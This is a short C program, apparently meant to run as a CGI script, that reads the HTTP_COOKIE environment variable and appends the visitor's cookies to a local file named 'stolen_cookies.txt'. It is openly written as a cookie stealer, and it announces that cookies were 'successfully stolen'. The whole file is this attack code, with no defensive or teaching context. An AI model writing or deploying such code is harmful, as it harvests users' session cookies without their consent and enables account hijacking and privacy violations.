#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char* cookies = getenv("HTTP_COOKIE");
    if (cookies == NULL) {
        printf("No cookies found!");
        return 1;
    }

    FILE* file = fopen("stolen_cookies.txt", "a");
    if (file == NULL) {
        printf("Failed to open file!");
        return 1;
    }

    fputs(cookies, file);
    fclose(file);
    printf("Cookies successfully stolen and saved in stolen_cookies.txt!");

    return 0;
}
